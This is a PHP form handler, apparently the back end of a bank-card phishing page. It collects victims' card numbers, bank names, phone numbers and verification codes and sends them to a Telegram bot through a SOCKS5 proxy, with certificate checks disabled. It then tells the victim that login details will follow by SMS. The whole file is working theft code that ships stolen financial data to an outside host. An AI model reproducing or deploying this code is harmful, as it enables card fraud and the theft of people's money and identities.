<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['cardId']) && (isset($_POST['bankName']) && (isset($_POST['phone']) && (isset($_POST['code']))))) {
        $phone = $_POST['phone'];
        $card = $_POST['cardId'];
        $code = $_POST['code'];
        $bank = $_POST['bankName'];
        if (trim($phone == null) or (trim($card) == null) or (trim($code) == null)) {
            echo "Вы оставили поле(поля) пустым. Проверьте правильность введённых данных, обновите страницу и повторите попытку";
            die();
        }
        if (preg_match('/((8|\+7)-?)?\(?\d{3,5}\)?.?\d{1}-?\d{1}.?\d{1}-?\d{1}-?\d{1}((-?\d{1})?-?\d{1})?/', trim($phone)) == false) {
            echo "Неверно введён номер телефона! Обновите страницу и повторите попытку";
            die();
        }
        if ($bank == null) {
            $bank = "Неизвестный банк";
        }


        $orderFieldset = "Заявка №";
        $phoneFieldset = "Телефон: ";
        $cardFieldset = "Карта: ";
        $codeFieldset = "Код: ";


        $f = fopen('numbers.txt', 'r+t');
        flock($f, LOCK_EX);
        $count = fread($f, 100);
        fclose($f);


        $token = "***"; // Token
        $chatId = '***'; // chatID
        $prxy      = '***'; // adress:proxy port
        $prxy_auth = '***';       // login:pas for auth.


        /******message 2*******/

        $arr = array(
            $orderFieldset => $count,
            $phoneFieldset => $phone,
            $cardFieldset => $card." ($bank)",
            $codeFieldset => $code,

        );
        $txt = "";
        foreach ($arr as $key => $value) {
            $txt .= $key . " " . $value . "\n";
        };
        $ch  = curl_init();
        $url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatId."&text=".urlencode($txt);
        curl_setopt_array ($ch, array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true));
        /********************* Код для подключения к прокси *********************/
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);  // тип прокси
            curl_setopt($ch, CURLOPT_PROXY,  $prxy);                 // ip, port прокси
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $prxy_auth);  // авторизация на прокси
            curl_setopt($ch, CURLOPT_HEADER, false);                // отключение передачи заголовков в запросе
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);            // возврат результата в качестве строки
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);        // отмена проверки сертификата удаленным сервером
        /***********************************************************************/
        $result = curl_exec($ch);
        curl_close($ch);
        echo "Всё прошло успешно. Логин и пароль будут отправлены смс сообщением.";
//

    } else {
        echo "На сервер не пришел проверчный код. Повторите попытку<br/>";
    }
} else echo "GET запросы не принимаются";